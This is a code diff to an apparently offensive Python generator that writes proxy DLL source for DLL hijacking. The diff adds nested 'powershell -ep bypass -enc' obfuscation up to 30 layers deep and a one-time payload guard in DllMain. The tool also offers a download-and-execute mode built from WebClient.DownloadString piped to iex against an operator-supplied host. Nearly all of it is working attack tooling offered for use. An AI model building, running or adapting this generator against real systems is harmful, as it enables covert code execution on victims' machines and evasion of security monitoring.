@@ -4,6 +4,7 @@ import os
 import sys
 import base64
 
+
 banner = r"""
 
                                                                                  __  __  __ 
@@ -25,23 +26,45 @@ forked of: mrexodia         Resource: https://github.com/mrexodia/perfect-dll-pr
 
 print(banner)
 
-def encode_ps(cmd):
-    """Encode command in Base64 UTF-16LE for PowerShell -enc."""
+
+def encode_ps(cmd: str) -> str:
+    """Encode a command as Base64 UTF-16LE for PowerShell -enc."""
     return base64.b64encode(cmd.encode("utf-16le")).decode()
 
-def recursive_encode_ps(cmd, levels):
-    """Recursively Base64-encode ONLY the content, not nested PS invocations."""
+
+def recursive_encode_ps(cmd: str, levels: int) -> str:
+    """
+    Build a nested PowerShell -enc chain of the requested depth.
+
+    Depth 1:
+        powershell -ep bypass -enc B64("calc.exe")
+
+    Depth 2:
+        powershell -ep bypass -enc B64("powershell -ep bypass -enc B64('calc.exe')")
+
+    Depth N:
+        Each layer decodes to another 'powershell -ep bypass -enc ...'
+        until the innermost finally decodes and runs the original cmd.
+    """
     if levels < 1:
         levels = 1
     if levels > 30:
         print("[-] ERROR: Max encoding depth is 30.")
         sys.exit(1)
 
-    encoded = cmd
-    for _ in range(levels):
-        encoded = base64.b64encode(encoded.encode("utf-16le")).decode()
+    # Start from the original command that we want to end up executing
+    script = cmd
 
-    return f"powershell -ep bypass -enc {encoded}"
+    # For levels > 1, wrap the previous script in another powershell -enc
+    # but always encode VALID PowerShell code, not raw Base64
+    for _ in range(levels - 1):
+        inner_b64 = encode_ps(script)
+        script = f"powershell -ep bypass -enc {inner_b64}"
+
+    # Outermost layer: this is what we'll actually run via cmd.exe /c
+    outer_b64 = encode_ps(script)
+    return f"powershell -ep bypass -enc {outer_b64}"
+
 
 def main():
     parser = argparse.ArgumentParser(description="Generate a proxy DLL")
@@ -49,7 +72,6 @@ def main():
     parser.add_argument("--output", "-o", help="Generated C++ proxy file")
     parser.add_argument("--force-ordinals", "-v", action="store_true")
 
-    # Custom opts
     parser.add_argument("--cmd", help="Command to execute")
     parser.add_argument("--ip", help="IP for downloads")
     parser.add_argument("--down", help="Download file but do NOT execute")
@@ -67,7 +89,6 @@ def main():
     user_downexe: str = args.downexe
     enc_depth: int = args.enc
 
-    # PRIORITY SYSTEM
     if user_downexe:
         user_cmd = (
             f"(New-Object System.Net.WebClient).DownloadString('http://{user_ip}/{user_downexe}') | iex"
@@ -87,7 +108,6 @@ def main():
         user_cmd = "echo NoCommandProvided"
         mode = "none"
 
-    # ENCODING
     if enc_depth:
         final_ps = recursive_encode_ps(user_cmd, enc_depth)
         final_cmd = f"cmd.exe /c {final_ps}"
@@ -159,9 +179,11 @@ def main():
 
         if macros:
             f.write("#ifdef _WIN64\n")
-            for m in macros: f.write(m + "\n")
+            for m in macros: 
+                f.write(m + "\n")
             f.write("#else\n")
-            for m in macros_32: f.write(m + "\n")
+            for m in macros_32: 
+                f.write(m + "\n")
             f.write("#endif\n\n")
 
         for e in regular_exports:
@@ -171,13 +193,24 @@ def main():
         for e, o in ordinal_exports:
             f.write(f"#pragma comment(linker, MAKE_EXPORT_ORDINAL(\"{e}\", {o}))\n")
 
+        # ---- DllMain with final command (guarded, only once per process) ----
         f.write(f"""
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
 {{
+    // Ensure payload only runs once per process
+    static BOOL g_Executed = FALSE;
+
     switch (fdwReason)
     {{
         case DLL_PROCESS_ATTACH:
         {{
+            if (g_Executed)
+                return TRUE;
+            g_Executed = TRUE;
+
+            // Avoid extra thread notifications
+            DisableThreadLibraryCalls(hinstDLL);
+
             STARTUPINFOA si = {{ 0 }};
             PROCESS_INFORMATION pi = {{ 0 }};
             si.cb = sizeof(si);
@@ -215,7 +248,7 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
         print(f"[ + ] Download & executed from: http://{user_ip}/{user_downexe}")
 
     if enc_depth:
-        print(f"[ + ] {enc_depth} times encoded in Base64")
+        print(f"[ + ] {enc_depth} times encoded in Base64 (recursive PowerShell chain)")
 
     print(f"[ + ] Output file successfully created: {output}")
 
